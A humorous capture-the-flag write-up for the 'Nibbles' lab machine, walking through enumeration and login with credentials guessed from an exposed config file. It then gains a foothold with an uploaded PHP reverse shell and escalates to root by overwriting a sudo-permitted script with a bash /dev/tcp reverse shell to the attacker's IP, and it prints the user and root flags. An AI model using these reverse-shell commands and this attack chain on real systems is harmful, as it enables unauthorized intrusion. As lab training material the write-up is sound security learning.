# Nibbles

Let’s kick things off with a quick Nmap scan to see what we’re working with:

```shellscript
$ nmap -sC -sV 10.129.50.32
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-21 01:47 CST
Nmap scan report for 10.129.50.32
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.03 seconds
```

Results are pretty simple, we’ve got SSH (probably not immediately useful) and a web server (almost definitely useful).

Heading to the webpage gives us the most inspiring content ever written:

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

> **Hello world!**

Truly groundbreaking. Pulitzer-worthy.

Whenever the page is boring, the source code usually has the gossip. Sure enough, peeking at the HTML reveals a comment mentioning `/nibbleblog` :

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Alright then. Off we go.

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

The `/nibbleblog/` page itself wasn’t screaming “hack me,” so I let Gobuster do what it does best:

```shellscript
$ gobuster dir -u http://10.129.50.32/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.50.32/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 302]
/.htaccess            (Status: 403) [Size: 307]
/.htpasswd            (Status: 403) [Size: 307]
/README               (Status: 200) [Size: 4628]
/admin                (Status: 301) [Size: 323] [--> http://10.129.50.32/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 325] [--> http://10.129.50.32/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 327] [--> http://10.129.50.32/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 325] [--> http://10.129.50.32/nibbleblog/plugins/]
/themes               (Status: 301) [Size: 324] [--> http://10.129.50.32/nibbleblog/themes/]
Progress: 4723 / 4724 (99.98%)
===============================================================
Finished
===============================================================
```

Visiting **/admin.php** gives us a login screen:

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Naturally, I tried the classic `admin:admin` and the site immediately hit me with the “absolutely not” and blacklisted me after a refresh.

So brute forcing? Dead.\
My ego? Slightly bruised.\
Plan B? Activated.

Since brute forcing was off the table, I started poking through the directories Gobuster found. Eventually I stumbled on `/nibbleblog/content/private/config.xml`

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Which is basically the server whispering: “Hey… you want some creds?” Inside the file, I noticed “nibble” popping up in the title and email. So I tried `admin:nibbles` as credentials for the login page.&#x20;

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

And... yep. It worked. I love it when passwords are themed. Once logged in, we can upload a simple PHP reverse shell (Nibbleblog has a known foothold here). I set up a listener:

```shellscript
$ nc -nvlp 4444
listening on [any] 4444 ...
```

Then triggered the uploaded payload by visiting: `http://10.129.50.32/nibbleblog/content/private/plugins/my_image/image.php`&#x20;

And the box called back immediately:

```shellscript
$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.102] from (UNKNOWN) [10.129.50.32] 42314
```

Upgrade the shell because we’re civilized and do a quick check:

```shellscript
python3 -c 'import pty; pty.spawn("/bin/bash")'
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ whoami                  
nibbler
```

All good? Then it's user flag time:

```shellscript
nibbler@Nibbles:/$ cd /home/nibbler
cd /home/nibbler
nibbler@Nibbles:/home/nibbler$ cat user.txt
cat user.txt
79c03865431abf47b90ef24b9695e148
```

> **User flag:** 79c03865431abf47b90ef24b9695e148

As always:

```shellscript
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

And we get a beautiful gift: `/home/nibbler/personal/stuff/monitor.sh` . So we can run `monitor.sh` as root… without a password. Which is basically the system saying: “Please become root. No seriously. I insist.”

Since we can execute and edit that script now, the easiest path is to replace its contents with a reverse shell:

```shellscript
bash -c 'exec bash -i &>/dev/tcp/10.10.14.102/12345 <&1'
```

Set up a listener:

```shellscript
$ nc -nvlp 12345
listening on [any] 12345 ...
```

Then run the script as root:

```shellscript
$ sudo /home/nibbler/personal/stuff/monitor.sh
```

And boom:

```shellscript
$ nc -nvlp 12345
listening on [any] 12345 ...
connect to [10.10.14.102] from (UNKNOWN) [10.129.50.32] 47034
root@Nibbles:/home/nibbler/personal/stuff# whoami
whoami
root
```

Root access acquired. Grab the root flag and GG.

```shellscript
root@Nibbles:/home/nibbler/personal/stuff# cat /root/root.txt
cat /root/root.txt
de5e5d6619862a8aa5b9b212314e0cdd
```

> **Root flag:** de5e5d6619862a8aa5b9b212314e0cdd
